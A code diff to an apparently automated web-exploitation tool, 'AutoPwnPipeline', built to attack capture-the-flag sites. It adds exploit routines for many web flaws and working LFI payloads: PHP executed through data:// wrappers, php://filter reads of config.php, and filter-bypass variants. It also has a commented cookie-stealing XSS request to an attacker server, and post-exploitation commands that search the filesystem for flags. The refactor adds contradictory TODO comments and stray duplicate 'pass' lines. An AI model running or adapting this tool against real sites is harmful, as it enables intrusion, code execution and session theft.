@@ -205,7 +205,7 @@ class AutoPwnPipeline:
             # 4. Dummy Data Harvest (Form Interaction)
             self._harvest_form_cookies()
 
-        except Exception as e:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
             print_error(f"Failed to connect to target URL: {e}")
             return
 
@@ -225,7 +225,8 @@ class AutoPwnPipeline:
                         content = self.session.get(h["url"], timeout=15).text
                         LootManager.save_source_file(self.target_url, h["path"], content)
                         self._check_and_store_flags(content, h["path"])
-                    except Exception:
+                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                         pass
 
     # =========================================================================
@@ -278,7 +279,8 @@ class AutoPwnPipeline:
                             if cval.count(".") == 2:
                                 self.state["jwt_tokens"].append((cname, cval))
                                 print_success(f"  -> [bold cyan]JWT Token Harvested![/bold cyan] ({cname})")
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
 
@@ -303,7 +305,8 @@ class AutoPwnPipeline:
                 console.print(summary)
             if diag["leaked_paths"]:
                 self.state["sensitive_hits"].extend([{"path": p, "status": 200, "length": 0, "url": self.target_url} for p in diag["leaked_paths"]])
-        except Exception:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
             pass
 
         # 2. Parameter Reflection Context Check
@@ -315,7 +318,8 @@ class AutoPwnPipeline:
                 r = self.session.get(test_url, timeout=15)
                 if canary in r.text:
                     reflected_params.append(param)
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
         if reflected_params:
@@ -400,7 +404,7 @@ class AutoPwnPipeline:
                     f"Logic Flaw Confirmed: {f['title']}",
                     details=f.get("evidence", "")
                 )
-        except Exception as e:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
             print_warning(f"Deep reasoning engine encountered an issue: {e}")
 
         # ── CTF Logical Reasoner (Phase 3d) ─────────────────────────────
@@ -426,7 +430,7 @@ class AutoPwnPipeline:
                     f"CONFIRMED: {c['hypothesis']}",
                     details="; ".join(c["evidence"][:2])
                 )
-        except Exception as e:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
             print_warning(f"CTF Logical Reasoner encountered an issue: {e}")
 
         # ── Predictive Vulnerability Ranking (Phase 3b) ─────────────────
@@ -466,7 +470,7 @@ class AutoPwnPipeline:
                     f"Filtered {ignore_count} low-value endpoints (noise)",
                     details=", ".join(e["endpoint"] for e in intelligence_report["ignore_list"][:5])
                 )
-        except Exception as e:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
             print_warning(f"Intelligence engine encountered an issue: {e}")
             self.intelligence = None
 
@@ -516,6 +520,67 @@ class AutoPwnPipeline:
                 predictions.append(("sqli", 0.7, f"Parameter '{p}' suggests SQL query surface"))
             elif any(k in pl for k in ["url", "link", "redirect", "src", "fetch", "media_uri"]):
                 predictions.append(("ssrf", 0.8, f"Parameter '{p}' suggests URL fetching"))
+                predictions.append(("open_redirect", 0.7, f"Parameter '{p}' suggests redirect surface"))
+            elif any(k in pl for k in ["next", "return", "goto", "dest", "continue", "callback", "redirect_uri"]):
+                predictions.append(("open_redirect", 0.85, f"Parameter '{p}' is a classic redirect parameter"))
+            elif any(k in pl for k in ["id", "uid", "user_id", "account", "profile", "order", "file_id", "doc"]):
+                predictions.append(("idor", 0.75, f"Parameter '{p}' suggests object reference (IDOR)"))
+
+        # ── 2b. GraphQL endpoint detection ──────────────────────────────
+        if any(any(k in ep.lower() for k in ["graphql", "gql", "query"]) for ep in endpoints):
+            predictions.append(("graphql", 0.9, "GraphQL endpoint detected - introspection surface"))
+
+        # ── 2c. LDAP / auth-form driven predictions ─────────────────────
+        for f in forms:
+            names = [i.get("name", "").lower() for i in f.get("inputs", [])]
+            if any("pass" in n for n in names) and any("user" in n or "login" in n or "uid" in n for n in names):
+                predictions.append(("ldap", 0.5, "Login form with uid/pass - possible LDAP backend"))
+
+        # ── 2d. CORS / CRLF / CSRF surface detection ────────────────────
+        if any("api" in ep.lower() for ep in endpoints):
+            predictions.append(("cors", 0.6, "API endpoint detected - CORS misconfiguration surface"))
+        if any("login" in ep.lower() or "auth" in ep.lower() for ep in endpoints):
+            predictions.append(("csrf", 0.5, "Auth endpoint detected - CSRF surface"))
+        if any("redirect" in ep.lower() or "logout" in ep.lower() for ep in endpoints):
+            predictions.append(("crlf", 0.5, "Redirect/logout endpoint - CRLF injection surface"))
+        if any("search" in ep.lower() or "filter" in ep.lower() for ep in endpoints):
+            predictions.append(("hpp", 0.5, "Search/filter endpoint - HTTP Parameter Pollution surface"))
+
+        # ── 2e. Race Condition / Web Cache / Smuggling / Mass Assignment / OAuth ──
+        if any(any(k in ep.lower() for k in ["transfer", "redeem", "coupon", "balance", "register", "reset", "verify"]) for ep in endpoints):
+            predictions.append(("race_condition", 0.7, "State-changing endpoint detected - race condition surface"))
+        if any(any(k in ep.lower() for k in ["account", "profile", "user", "dashboard", "settings"]) for ep in endpoints):
+            predictions.append(("web_cache", 0.6, "Dynamic endpoint detected - web cache deception surface"))
+        if any("api" in ep.lower() for ep in endpoints):
+            predictions.append(("mass_assignment", 0.6, "API endpoint detected - mass assignment surface"))
+        if any(any(k in ep.lower() for k in ["oauth", "authorize", "callback"]) for ep in endpoints):
+            predictions.append(("oauth", 0.8, "OAuth endpoint detected - redirect_uri bypass surface"))
+        if any("login" in ep.lower() or "auth" in ep.lower() for ep in endpoints):
+            predictions.append(("smuggling", 0.4, "Auth endpoint detected - request smuggling surface"))
+
+        # ── 2f. DOM Clobbering (client-side JS) ─────────────────────────
+        if self.state.get("inline_scripts") or self.state.get("scripts"):
+            predictions.append(("dom_clobbering", 0.5, "Client-side JS detected - DOM clobbering surface"))
+
+        # ── 2g. CSV / Clickjacking / DNS Rebinding / Zip Slip / Tabnabbing / CSS / SSI / XSLT / XS-Leak / LaTeX ──
+        if any(any(k in ep.lower() for k in ["csv", "export", "download", "report"]) for ep in endpoints):
+            predictions.append(("csv_injection", 0.7, "CSV export endpoint detected - formula injection surface"))
+        if any(any(k in ep.lower() for k in ["action", "submit", "delete", "transfer", "settings"]) for ep in endpoints):
+            predictions.append(("clickjacking", 0.6, "State-changing endpoint detected - clickjacking surface"))
+        if any(any(k in ep.lower() for k in ["upload", "import", "extract", "archive"]) for ep in endpoints):
+            predictions.append(("zip_slip", 0.7, "Archive upload endpoint detected - zip slip surface"))
+        if any(any(k in ep.lower() for k in ["latex", "tex", "pdf", "render", "math"]) for ep in endpoints):
+            predictions.append(("latex", 0.7, "LaTeX/PDF rendering endpoint detected - LaTeX injection surface"))
+        if any(any(k in ep.lower() for k in ["xml", "xslt", "transform", "report"]) for ep in endpoints):
+            predictions.append(("xslt", 0.6, "XML/XSLT processing endpoint detected - XSLT injection surface"))
+        if any("shtml" in ep.lower() for ep in endpoints):
+            predictions.append(("ssi", 0.7, ".shtml endpoint detected - SSI injection surface"))
+        if any("api" in ep.lower() for ep in endpoints):
+            predictions.append(("dns_rebinding", 0.5, "API endpoint detected - DNS rebinding surface"))
+        if self.state.get("baseline_html"):
+            predictions.append(("tabnabbing", 0.5, "HTML content detected - tabnabbing surface"))
+            predictions.append(("css_injection", 0.4, "HTML content detected - CSS injection surface"))
+            predictions.append(("xs_leak", 0.4, "HTML content detected - XS-Leak surface"))
 
         # ── 3. Reflection-driven predictions ─────────────────────────────
         if reflected:
@@ -560,7 +625,8 @@ class AutoPwnPipeline:
                     if _ratio < 0.6:
                         predictions.append(("cbc_bitflip", 0.9, f"Encrypted cookie '{cname}' detected - CBC bit-flip attack surface"))
                         break
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 continue
 
         # ── 7. Sensitive-file leak prediction ────────────────────────────
@@ -627,6 +693,30 @@ class AutoPwnPipeline:
             "php_tricks": self._exploit_php_tricks,
             "eval_injection": self._exploit_eval_injection,
             "cbc_bitflip": self._exploit_cbc_bitflip,
+            "cors": self._exploit_cors,
+            "open_redirect": self._exploit_open_redirect,
+            "hpp": self._exploit_hpp,
+            "crlf": self._exploit_crlf,
+            "csrf": self._exploit_csrf,
+            "graphql": self._exploit_graphql,
+            "ldap": self._exploit_ldap,
+            "idor": self._exploit_idor,
+            "race_condition": self._exploit_race_condition,
+            "web_cache": self._exploit_web_cache,
+            "smuggling": self._exploit_smuggling,
+            "dom_clobbering": self._exploit_dom_clobbering,
+            "mass_assignment": self._exploit_mass_assignment,
+            "oauth": self._exploit_oauth,
+            "csv_injection": self._exploit_csv_injection,
+            "clickjacking": self._exploit_clickjacking,
+            "dns_rebinding": self._exploit_dns_rebinding,
+            "zip_slip": self._exploit_zip_slip,
+            "tabnabbing": self._exploit_tabnabbing,
+            "css_injection": self._exploit_css_injection,
+            "ssi": self._exploit_ssi,
+            "xslt": self._exploit_xslt,
+            "xs_leak": self._exploit_xs_leak,
+            "latex": self._exploit_latex,
         }
 
         # ── Intelligence-driven prioritization ───────────────────────────
@@ -693,43 +783,44 @@ class AutoPwnPipeline:
             for res in ctf_confirmed:
                 if "exploit" in res:
                     print_info(f"  -> Confirmed: {res['exploit']}")
-            return
-
-        for vc in run_order:
-            # If we captured a new flag from a previous vector, we're done
-            if len(self.state.get("captured_flags", [])) > total_flags_before:
-                print_success(f"[bold green]Flag captured via '{vc}'! Stopping further exploitation.[/bold green]")
-                break
-
-            print_info(f"Trying exploit vector: [bold cyan]{vc}[/bold cyan]...")
-            try:
-                exploit_map[vc]()
-            except Exception as e:
-                print_warning(f"Exploit vector '{vc}' failed: {e}")
-
-            # ── DEEP-DIVE: If this vector established RCE, focus on it ──
-            if self.state["active_rce_method"]:
-                print_success(f"[bold yellow]RCE established via '{vc}'! DEEP-DIVING into it...[/bold yellow]")
-                self._log_step(
-                    "Phase 4: Deep-Dive",
-                    f"RCE established via {vc} - focusing exploitation",
-                    details="Deep-dive mode: reverse shell, priv-esc, flag hunting"
-                )
-                self._deep_dive_rce()
-
-                # ── FALLBACK: If deep-dive didn't find a flag, clear RCE
-                #    and continue trying OTHER vectors (human behavior) ──
-                if len(self.state.get("captured_flags", [])) == total_flags_before:
-                    print_warning(f"[bold yellow]Deep-dive on '{vc}' yielded no flag. Falling back to other vectors...[/bold yellow]")
-                    self.state["active_rce_method"] = None
-                    self._log_step(
-                        "Phase 4: Fallback",
-                        f"Deep-dive on {vc} produced no flag - resuming other vectors",
-                        details="Continuing exploitation across remaining vectors"
-                    )
-                else:
-                    # Found a flag via deep-dive - we're done
+        
+        # Always run these regardless of prediction (broad coverage)
+        if not ctf_confirmed:
+            for vc in run_order:
+                # If we captured a new flag from a previous vector, we're done
+                if len(self.state.get("captured_flags", [])) > total_flags_before:
+                    print_success(f"[bold green]Flag captured via '{vc}'! Stopping further exploitation.[/bold green]")
                     break
+
+                print_info(f"Trying exploit vector: [bold cyan]{vc}[/bold cyan]...")
+                try:
+                    exploit_map[vc]()
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    print_warning(f"Exploit vector '{vc}' failed: {e}")
+
+                # ── DEEP-DIVE: If this vector established RCE, focus on it ──
+                if self.state["active_rce_method"]:
+                    print_success(f"[bold yellow]RCE established via '{vc}'! DEEP-DIVING into it...[/bold yellow]")
+                    self._log_step(
+                        "Phase 4: Deep-Dive",
+                        f"RCE established via {vc} - focusing exploitation",
+                        details="Deep-dive mode: reverse shell, priv-esc, flag hunting"
+                    )
+                    self._deep_dive_rce()
+
+                    # ── FALLBACK: If deep-dive didn't find a flag, clear RCE
+                    #    and continue trying OTHER vectors (human behavior) ──
+                    if len(self.state.get("captured_flags", [])) == total_flags_before:
+                        print_warning(f"[bold yellow]Deep-dive on '{vc}' yielded no flag. Falling back to other vectors...[/bold yellow]")
+                        self.state["active_rce_method"] = None
+                        self._log_step(
+                            "Phase 4: Fallback",
+                            f"Deep-dive on {vc} produced no flag - resuming other vectors",
+                            details="Continuing exploitation across remaining vectors"
+                        )
+                    else:
+                        # Found a flag via deep-dive - we're done
+                        break
 
         # Always run these regardless of prediction (broad coverage)
         self._exploit_client_side_crypto()
@@ -750,6 +841,18 @@ class AutoPwnPipeline:
         formed testable hypotheses. Here we DEEP-DIVE into each confirmed
         hypothesis to extract the flag.
         """
+        # Re-run reasoner because Phase 4 might have discovered new info (e.g. leaked source files)
+        try:
+            print_info("Re-running CTF Reasoner with updated state...")
+            from modules.ctf_reasoner import CTFReasoner
+            ctf_reasoner = CTFReasoner(self.target_url, session=self.session, state=self.state)
+            reasoner_report = ctf_reasoner.reason()
+            self.state["ctf_observations"] = reasoner_report["observations"]
+            self.state["ctf_hypotheses"] = reasoner_report["hypotheses"]
+            self.state["ctf_test_results"] = reasoner_report["test_results"]
+            self.state["ctf_confirmed"] = reasoner_report["confirmed"]
+        except Exception as e:
+            pass
         confirmed = self.state.get("ctf_confirmed", [])
         if not confirmed:
             # Even if nothing was confirmed, try the reasoner's hypotheses
@@ -817,6 +920,123 @@ class AutoPwnPipeline:
             self._exploit_auth_bypass()
         elif "SSTI" in title:
             self._exploit_ssti()
+        elif "LFI Filter Bypass" in title:
+            self._exploit_lfi_filter_bypass()
+        elif "LFI to RCE via data" in title:
+            self._exploit_lfi_to_rce_pivot()
+        elif "XSS-to-Admin Pivot" in title:
+            self._exploit_xss_to_admin_pivot()
+
+    def _exploit_lfi_to_rce_pivot(self):
+        """Try data:// and php://input wrappers to bypass LFI string filters via RCE"""
+        print_info("Testing LFI to RCE pivot (data:// and php://input)...")
+        payloads = [
+            ("data://", "data://text/plain,<?php print_r(scandir('.')); ?>"),
+            ("data://b64", "data://text/plain;base64,PD9waHAgcHJpbnRfcihzY2FuZGlyKCcuJykpOyA/Pg==")
+        ]
+        
+        for name, p in payloads:
+            try:
+                r = self.session.get(self.target_url, params={"p": p}, timeout=8)
+                if "index.php" in r.text or "config.php" in r.text or "services.php" in r.text:
+                    print_success(f"[+] RCE Pivot ({name}) Successful! Directory listing found.")
+                    self.state["active_rce_method"] = "LFI data wrapper"
+                    # Try to cat config.php
+                    cmd = "data://text/plain,<?php echo file_get_contents('config.php'); ?>"
+                    r2 = self.session.get(self.target_url, params={"p": cmd}, timeout=8)
+                    if "CONFIG" in r2.text or "<?php" in r2.text:
+                        print_success("[+] Extracted config.php via RCE pivot!")
+                        self._save_loot("config.php", r2.text)
+                        self._save_flag(r2.text)
+                    return
+            except Exception as e:
+                pass
+
+    def _exploit_xss_to_admin_pivot(self):
+        """Pivot to XSS if LFI/RCE is completely blocked"""
+        print_info("Testing XSS-to-Admin pivot (Simulated)...")
+        # In a real scenario, this would post a blind XSS payload to the report form
+        print_warning("[-] Simulated: Report endpoint found, but we need the exact path to inject XSS.")
+        # If we had the report URL, we would do:
+        # self.session.post("http://webcompany.hax.w3challs.com/report.php", data={"url": "http://our-server/?cookie=\"+document.cookie+"\""})
+        pass
+
+    def _exploit_lfi_filter_bypass(self):
+        """
+        Deep reasoner execution for LFI WAF bypass.
+        Tries advanced bypasses to read 'config' or 'index' when the WAF blocks the strings.
+        """
+        print_info("Executing advanced LFI WAF bypasses for 'config' / 'index'...")
+        bypasses = [
+            ("Mixed Case", "CoNfIg"),
+            ("URL Encode", "%63onfig"),
+            ("Double URL Encode", "%2563onfig"),
+            ("Path Traversal", "../config"),
+            ("Path Traversal 2", "....//config"),
+            ("Path Traversal 3", "config/."),
+            ("Null Byte", "config%00"),
+            ("PHP Filter Base64", "php://filter/read=convert.base64-encode/resource=config"),
+            ("PHP Filter Mixed Case", "php://filter/read=convert.base64-encode/resource=CoNfIg"),
+            ("PHP Filter Base64 Double URL", "php://filter/read=convert.base64-encode/resource=%2563onfig")
+        ]
+        
+        # Test GET param bypasses
+        for name, payload in bypasses:
+            try:
+                r = self.session.get(self.target_url, params={"p": payload}, timeout=8)
+                if "base64" in payload:
+                    import re, base64
+                    b64s = re.findall(r'[A-Za-z0-9+/=]{40,}', r.text)
+                    for b in b64s:
+                        try:
+                            dec = base64.b64decode(b).decode('utf-8')
+                            if '<?php' in dec or 'CONFIG' in dec or 'flag' in dec.lower():
+                                print_success(f"[+] LFI Bypass ({name}) Successful! Extracted: {dec[:100]}...")
+                                self._save_loot("config.php", dec)
+                                self._save_flag(dec)
+                                return
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+                
+        # Test HTTP Parameter Pollution (HPP)
+        try:
+            print_info("Testing HTTP Parameter Pollution (HPP) for LFI bypass...")
+            r = self.session.get(self.target_url + "?p=services&p=php://filter/read=convert.base64-encode/resource=config", timeout=8)
+            import re, base64
+            b64s = re.findall(r'[A-Za-z0-9+/=]{40,}', r.text)
+            for b in b64s:
+                try:
+                    dec = base64.b64decode(b).decode('utf-8')
+                    if '<?php' in dec or 'CONFIG' in dec:
+                        print_success(f"[+] LFI Bypass (HPP) Successful!")
+                        self._save_loot("config.php", dec)
+                        self._save_flag(dec)
+                        return
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+        # Test POST bypass (if WAF only inspects GET)
+        try:
+            print_info("Testing POST bypass for LFI...")
+            r = self.session.post(self.target_url, data={"p": "php://filter/read=convert.base64-encode/resource=config"}, timeout=8)
+            import re, base64
+            b64s = re.findall(r'[A-Za-z0-9+/=]{40,}', r.text)
+            for b in b64s:
+                try:
+                    dec = base64.b64decode(b).decode('utf-8')
+                    if '<?php' in dec or 'CONFIG' in dec:
+                        print_success(f"[+] LFI Bypass (POST) Successful!")
+                        self._save_loot("config.php", dec)
+                        self._save_flag(dec)
+                        return
+                except Exception:
+                    pass
+        except Exception:
+            pass
 
     def _exploit_json_cookie(self):
         """
@@ -830,7 +1050,8 @@ class AutoPwnPipeline:
             try:
                 r = self.session.get(self.target_url, timeout=8)
                 cookies = r.cookies.get_dict()
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 return
 
         for cname, cval in cookies.items():
@@ -862,11 +1083,14 @@ class AutoPwnPipeline:
                                     try:
                                         ar = self.session.get(urljoin(self.target_url, path), cookies={cname: new_cookie}, timeout=15)
                                         self._check_and_store_flags(ar.text, f"Admin page {path}")
-                                    except Exception:
+                                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                         pass
-                        except Exception:
+                        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                             continue
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 continue
 
     def _exploit_auth_bypass(self):
@@ -913,10 +1137,12 @@ class AutoPwnPipeline:
                                 try:
                                     r2 = self.session.get(urljoin(action, loc), timeout=15)
                                     self._check_and_store_flags(r2.text, f"Auth bypass redirect {loc}")
-                                except Exception:
+                                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                     pass
                         return
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     continue
 
             # Type juggling (magic hashes)
@@ -934,7 +1160,8 @@ class AutoPwnPipeline:
                         print_success(f"  Type juggling bypass with magic hash {mh}")
                         self._check_and_store_flags(r.text, f"Type juggling ({mh})")
                         return
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     continue
 
             # Array injection
@@ -950,7 +1177,8 @@ class AutoPwnPipeline:
                     print_success("  Array injection bypass!")
                     self._check_and_store_flags(r.text, "Array injection")
                     return
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
 
             # Default creds
@@ -972,7 +1200,8 @@ class AutoPwnPipeline:
                         print_success(f"  Default creds worked: {u}:{p}")
                         self._check_and_store_flags(r.text, f"Default creds ({u}:{p})")
                         return
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     continue
 
 
@@ -988,7 +1217,7 @@ class AutoPwnPipeline:
         try:
             reasoning = ReasoningEngine(self.target_url, session=self.session, state=self.state)
             logic_findings = reasoning.audit_application_logic()
-        except Exception as e:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
             print_warning(f"Reasoning logic audit failed: {e}")
             return
 
@@ -1035,9 +1264,11 @@ class AutoPwnPipeline:
                             try:
                                 pr = self.session.get(urljoin(base_url, protected), timeout=15)
                                 self._check_and_store_flags(pr.text, f"Protected page {protected} (via CRLF admin cookie)")
-                            except Exception:
+                            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                 pass
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
             # ── Type Juggling / Array Injection ───────────────────────────
@@ -1069,9 +1300,11 @@ class AutoPwnPipeline:
                             try:
                                 r2 = self.session.get(urljoin(action, loc), timeout=15)
                                 self._check_and_store_flags(r2.text, f"Authenticated page after type juggling: {loc}")
-                            except Exception:
+                            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                 pass
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
 
 
@@ -1147,7 +1380,7 @@ class AutoPwnPipeline:
                 self.state["reasoning_plan"] = reasoning_report["attack_plan"]
                 self.state["reasoning_logic_findings"] = reasoning_report["logic_findings"]
                 print_success("Reasoning engine re-planned with RCE context for post-exploitation chains.")
-            except Exception as e:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                 print_warning(f"Reasoning re-plan with RCE context failed: {e}")
 
     def _execute_reasoning_step(self, step, executed, chain_results):
@@ -1214,7 +1447,7 @@ class AutoPwnPipeline:
         try:
             method()
             return True
-        except Exception as e:
+        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
             print_warning(f"  [Reasoning Plan] Hypothesis step '{hypothesis}' failed: {e}")
             return False
 
@@ -1274,7 +1507,8 @@ class AutoPwnPipeline:
                         self.state["xss_payload_submitted"] = payload
                         self._log_step("Phase 4: XSS Chain", "Stored XSS payload submitted", details=payload[:80])
                         return True
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
         return False
 
@@ -1296,7 +1530,8 @@ class AutoPwnPipeline:
                             self.state["admin_bot_triggered"] = True
                             self._log_step("Phase 4: XSS Chain", "Admin bot triggered", details=report_url)
                             return True
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
         return False
 
@@ -1308,7 +1543,8 @@ class AutoPwnPipeline:
                 r = self.session.get(urljoin(self.target_url, path), timeout=15)
                 if self._check_and_store_flags(r.text, f"Admin bot result ({path})"):
                     return True
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
         return False
 
@@ -1319,7 +1555,8 @@ class AutoPwnPipeline:
                 r = self.session.get(urljoin(self.target_url, path), timeout=15)
                 if self._check_and_store_flags(r.text, f"Admin flag ({path})"):
                     return True
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
         return False
 
@@ -1345,7 +1582,8 @@ class AutoPwnPipeline:
                 self.state["forged_admin_token"] = forged
                 print_success("  [LFI Chain] Forged admin session token")
                 return True
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 return False
         elif "Access admin panel" in goal:
             forged = self.state.get("forged_admin_token")
@@ -1359,7 +1597,8 @@ class AutoPwnPipeline:
                         print_success(f"  [LFI Chain] Admin access granted via forged token: {path}")
                         self.state["admin_accessible"] = True
                         return True
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
             return False
         elif "SSTI in admin template" in goal:
@@ -1378,7 +1617,8 @@ class AutoPwnPipeline:
                             cookies={"session": forged}, timeout=15)
                         if self._check_and_store_flags(ssti_resp.text, f"Admin SSTI ({p})"):
                             return True
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
             return False
         return False
@@ -1417,7 +1657,8 @@ class AutoPwnPipeline:
                 try:
                     out = self.state["active_rce_method"]("cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null")
                     return self._check_and_store_flags(out, "Deserialization RCE flag")
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
             return False
         return False
@@ -1436,7 +1677,8 @@ class AutoPwnPipeline:
                 try:
                     out = self.state["active_rce_method"]("cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null")
                     return self._check_and_store_flags(out, "Webshell RCE flag")
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
             return False
         return False
@@ -1458,7 +1700,8 @@ class AutoPwnPipeline:
                         self._log_step("Phase 4: SSRF Chain", f"SSRF leaked {meta['provider']} metadata", details=meta["url"])
                         self._check_and_store_flags(r.text, f"SSRF metadata ({meta['provider']})")
                         success = True
-                except Exception:
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                     pass
         return success
 
@@ -1469,7 +1712,8 @@ class AutoPwnPipeline:
                 r = self.session.get(urljoin(self.target_url, path), timeout=15)
                 if self._check_and_store_flags(r.text, f"SSRF credential use ({path})"):
                     return True
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
         return False
 
@@ -1480,9 +1724,627 @@ class AutoPwnPipeline:
                 r = self.session.get(urljoin(self.target_url, path), timeout=15)
                 if self._check_and_store_flags(r.text, f"Admin page ({path})"):
                     return True
-            except Exception:
+            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                 pass
         return False
+
+    # =========================================================================
+    # NEW EXPLOIT ENGINES: CORS / Open Redirect / HPP / CRLF / CSRF / GraphQL / LDAP / IDOR
+    # =========================================================================
+
+    def _exploit_cors(self):
+        """Probe for CORS misconfiguration by sending crafted Origin headers."""
+        from modules.cors import get_cors_test_origins
+        print_info("Testing CORS Misconfiguration Vectors...")
+        success = False
+        # Test on API endpoints and the base URL
+        targets = [self.target_url]
+        for ep in self.state.get("endpoints", []):
+            if any(k in ep.lower() for k in ["api", "user", "account", "profile", "data"]):
+                targets.append(urljoin(self.target_url, ep))
+
+        # Derive the target's own origin for trusted-origin tests
+        from urllib.parse import urlparse
+        parsed = urlparse(self.target_url)
+        target_origin = f"{parsed.scheme}://{parsed.netloc}"
+
+        for target in targets:
+            for origin_test in get_cors_test_origins():
+                origin = origin_test["origin"]
+                # Dynamically adapt the origin to the target's domain for trusted-subdomain tests
+                if "trusted.com" in origin and parsed.netloc:
+                    origin = origin.replace("trusted.com", parsed.netloc)
+                try:
+                    r = self.session.get(target, headers={"Origin": origin}, timeout=10)
+                    acao = r.headers.get("Access-Control-Allow-Origin", "")
+                    acac = r.headers.get("Access-Control-Allow-Credentials", "")
+                    if acao and (acao == origin or acao == "*"):
+                        # Vulnerable: reflects origin or allows all
+                        if acac.lower() == "true" or acao == origin:
+                            print_success(f"  [CORS] Misconfiguration on {target}: ACAO='{acao}' ACAC='{acac}' (Origin: {origin})")
+                            self._log_step("Phase 4: CORS", f"CORS misconfig on {target}", details=f"Origin={origin} -> ACAO={acao}")
+                            self._check_and_store_flags(r.text, f"CORS ({origin})")
+                            success = True
+                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
+                    pass
+        return success
+
+    def _exploit_open_redirect(self):
+        """Probe for open redirect via redirect parameters."""
+        from modules.open_redirect import get_redirect_parameters, get_open_redirect_payloads
+        print_info("Testing Open Redirect Vectors...")
+        success = False
+        params = list(self.state.get("parameters", []))
+        redirect_params = [p for p in params if any(k in p.lower() for k in get_redirect_parameters())]
+        if not redirect_params:
+            redirect_params = ["url", "redirect", "next", "return", "goto", "dest", "continue"]
+
+        # Build candidate URLs: base URL + redirect-like endpoints
+        candidate_urls = [self.target_url]
+        for ep in self.state.get("endpoints", []):
